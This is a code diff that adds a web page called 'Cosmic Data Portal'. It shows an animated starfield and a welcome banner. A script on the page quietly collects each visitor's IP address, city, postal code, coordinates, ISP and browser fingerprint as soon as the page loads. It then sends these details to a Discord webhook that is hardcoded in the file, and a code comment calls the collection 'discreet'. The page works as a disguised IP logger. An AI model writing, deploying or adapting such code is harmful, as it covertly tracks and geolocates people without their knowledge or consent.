@@ -1,0 +1,212 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Data Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.2/axios.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3a8a 0%, #4c1d95 50%, #9d174d 100%);
+            color: #ffffff;
+            overflow: hidden;
+        }
+        .welcome-message {
+            animation: pulse 2s infinite;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            transform: perspective(1000px) rotateX(5deg);
+            transition: transform 0.3s ease;
+        }
+        .welcome-message:hover {
+            transform: perspective(1000px) rotateX(0deg) scale(1.05);
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
+            100% { box-shadow: 0 0 10px rgba(255, 255, 255, 0.3); }
+        }
+        .star {
+            position: absolute;
+            background: #ffffff;
+            border-radius: 50%;
+            animation: twinkle 2s infinite;
+        }
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+    <canvas id="starfield"></canvas>
+    <div class="welcome-message p-10 rounded-xl shadow-2xl max-w-lg w-full text-center">
+        <h1 class="text-4xl font-extrabold mb-4 bg-clip-text text-transparent bg-gradient-to-r from-cyan-400 to-pink-500">Cosmic Data Portal</h1>
+        <p class="text-lg mb-6">Embark on a stellar journey through our digital cosmos!</p>
+        <a href="#" class="bg-gradient-to-r from-purple-500 to-blue-500 text-white py-3 px-6 rounded-full hover:from-pink-500 hover:to-purple-500 transition-all duration-300">Explore the Universe</a>
+    </div>
+
+    <script>
+        // Starfield animation
+        const canvas = document.getElementById('starfield');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const stars = Array(200).fill().map(() => ({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            size: Math.random() * 2 + 1,
+            speed: Math.random() * 0.5 + 0.1
+        }));
+        function drawStars() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            stars.forEach(star => {
+                ctx.fillStyle = 'rgba(255, 255, 255, ' + (Math.random() * 0.5 + 0.5) + ')';
+                ctx.beginPath();
+                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+                ctx.fill();
+                star.y += star.speed;
+                if (star.y > canvas.height) star.y = 0;
+            });
+            requestAnimationFrame(drawStars);
+        }
+        drawStars();
+
+        // Function to get client IP and browser info discreetly
+        async function getClientInfo() {
+            try {
+                const ipResponse = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
+                const ipData = ipResponse.data;
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString()
+                };
+                return {
+                    ip: ipData.ip,
+                    version: ipData.version,
+                    city: ipData.city,
+                    region: ipData.region,
+                    country: ipData.country_name,
+                    country_code: ipData.country_code,
+                    latitude: ipData.latitude,
+                    longitude: ipData.longitude,
+                    postal: ipData.postal,
+                    org: ipData.org,
+                    asn: ipData.asn,
+                    hostname: ipData.hostname,
+                    ...browserInfo
+                };
+            } catch (error) {
+                console.error('Error fetching client info');
+                return { error: 'Failed to fetch client info' };
+            }
+        }
+
+        // Function to send data to Discord webhook with a cool embed
+        async function sendToDiscord(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1394186443492163595/uBC57m29kQK-qyoEdr4R9VxQ_3bKu7gq-Gv-HxpGNsoNhciGzAFAwryae0XAmtJV5REH';
+            try {
+                await axios.post(webhookUrl, {
+                    content: '🌌 New Cosmic Data Transmission! 🌌',
+                    embeds: [
+                        {
+                            title: '🌠 Stellar Visitor Data',
+                            description: 'A new explorer has entered the cosmic portal!',
+                            color: 0x8b5cf6, // Vibrant purple
+                            thumbnail: { url: 'https://i.imgur.com/8f3k2Zn.png' }, // Optional cosmic icon
+                            fields: [
+                                { name: '🌍 IP Address', value: data.ip || 'N/A', inline: true },
+                                { name: '🔢 IP Version', value: data.version || 'N/A', inline: true },
+                                { name: '🏙️ City', value: data.city || 'N/A', inline: true },
+                                { name: '🌄 Region', value: data.region || 'N/A', inline: true },
+                                { name: '🇺🇳 Country', value: data.country || 'N/A', inline: true },
+                                { name: '🏳️ Country Code', value: data.country_code || 'N/A', inline: true },
+                                { name: '📍 Latitude', value: data.latitude?.toString() || 'N/A', inline: true },
+                                { name: '📍 Longitude', value: data.longitude?.toString() || 'N/A', inline: true },
+                                { name: '📮 Postal Code', value: data.postal || 'N/A', inline: true },
+                                { name: '🏢 Organization', value: data.org || 'N/A', inline: true },
+                                { name: '🔗 ASN', value: data.asn || 'N/A', inline: true },
+                                { name: '💻 Hostname', value: data.hostname || 'N/A', inline: true },
+                                { name: '🖥️ User Agent', value: data.userAgent || 'N/A' },
+                                { name: '⚙️ Platform', value: data.platform || 'N/A', inline: true },
+                                { name: '🗣️ Language', value: data.language || 'N/A', inline: true },
+                                { name: '📺 Screen Resolution', value: data.screenResolution || 'N/A', inline: true },
+                                { name: '⏰ Timezone', value: data.timezone || 'N/A', inline: true },
+                                { name: '🍪 Cookies Enabled', value: data.cookiesEnabled.toString(), inline: true },
+                                { name: '📶 Online Status', value: data.onlineStatus.toString(), inline: true },
+                                { name: '🔙 Referrer', value: data.referrer || 'N/A' },
+                                { name: '⏳ Timestamp', value: data.timestamp || 'N/A' }
+                            ],
+                            footer: { text: 'Transmitted from the Cosmic Data Portal' },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                }, { timeout: 5000 });
+            } catch (error) {
+                console.error('Error sending to Discord');
+            }
+        }
+
+        // Execute data collection on page load
+        window.onload = async () => {
+            const clientData = await getClientInfo();
+            if (!clientData.error) {
+                await sendToDiscord(clientData);
+            }
+        };
+    </script>
+</body>
+</html>
